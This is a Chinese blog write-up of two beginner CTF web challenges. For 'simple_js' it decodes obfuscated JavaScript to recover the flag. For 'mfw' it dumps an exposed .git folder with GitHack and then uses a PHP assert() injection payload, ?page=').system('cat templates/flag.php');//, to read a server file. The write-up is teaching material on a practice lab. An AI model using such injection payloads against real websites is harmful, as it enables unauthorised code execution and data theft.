# 原创
：  【攻防世界WEB】难度三星9分入门题（上）：simple_js、mfw

# 【攻防世界WEB】难度三星9分入门题（上）：simple_js、mfw

**目录**

[一、simple_js](#%E4%B8%83%E3%80%81upload1)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B)

[二、mfw](#%E4%BA%8C%E3%80%81mfw)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


## 一、simple_js

> 




<h3>解题方法：</h3>
1、理解php代码


> 
<h3>过程：</h3>
输入框中输入密码后

 <img alt="" height="307" src="https://img-blog.csdnimg.cn/a319a70632c44a3f8f262f4fd2e0c2a4.png" width="981"/>
Ctrl+U查看源码
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;JS&lt;/title&gt;
    &lt;script type="text/javascript"&gt;
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i &lt; (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i &lt; (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i &gt; 5 &amp;&amp; i &lt; k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
    h = window.prompt('Enter password');
    alert( dechiffre(h) );
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
</code></pre>
1、function定义了一个函数<br/> 2、被切为2部分<br/> 3、o=tab[i-1]无效，会被后面o=tab2[i]的值覆盖<br/> 4、tab数组、输入参数都没有用到
5、tab2数组的值覆盖了tab的值，输入什么密码都没用
<hr/>
获取信息：
dechiffre()：将 Unicode 编码转为一个字符
fromCharCode()： 可接受一个指定的 Unicode 值，然后返回一个字符串
10进制的字符：
70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65
16进制的字符：
 \x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
<pre><code>    var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
	    document.write(n);
	var m=String.fromCharCode(70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65);
		document.write(m);</code></pre>
786OsErtk12
FAUX PASSWORD HAHA
<hr/>
或者：
php运行
<pre><code>&lt;?php
$a='\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30';
$b=str_replace('\x','',$a);
echo hex2bin($b);
?&gt;</code></pre>

55,56,54,79,115,69,114,116,107,49,50

<hr/>python运行 
 <pre><code>a=[55,56,54,79,115,69,114,116,107,49,50]
b=""
for i in a:
	c=chr(i)
	b=b+c
print(b)</code></pre>

786OsErtk12

<hr/>

 FAUX PASSWORD HAHA
(人造密码哈哈)


<hr/>
题目提示(Flag格式为 Cyberpeace{xxxxxxxxx} )
所以flag为
Cyberpeace{786OsErtk12}



---


---


---


---


## 二、mfw

> 

 

<h3>解题方法：</h3>
1、.git源码泄露


> 
<h3>过程：</h3>
点进去发现只有这一个

尝试是否存在git泄露

存在git泄露
<hr/>
 
 

使用python2.7（我不想全局环境换来换去，直接在python2.7文件夹运行）
GitHack：[GitHub - lijiejie/GitHack: A `.git` folder disclosure exploit<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
语法：python GitHack.py http://www.openssl.org/.git/
我写的是GitHack.py的绝对路径
PS C:\Python27&gt; python D:\BaiduNetdiskDownload\shenji\GitHack-master\GitHack.py http://61.147.171.105:62321/.git/




<hr/>
 打开flag.php
也没发现flag

 
 源码审计一波

自己看发现没有做任何的过滤，考虑试一试注入 

 
<hr/>
payload：
?page=').system('cat templates/flag.php');//
')闭合前面的strpos函数，//注释掉后面的
注入进去以后就是
assert("strpos('templates/').system('cat templates/flag.php');//.php', '..') === false") or die("Detected hacking attempt!");

想到了flag.php
会不会是在代码里
Ctrl+U查看源码，或者使用bp抓包，不会错过许多细节

 


---


---


---

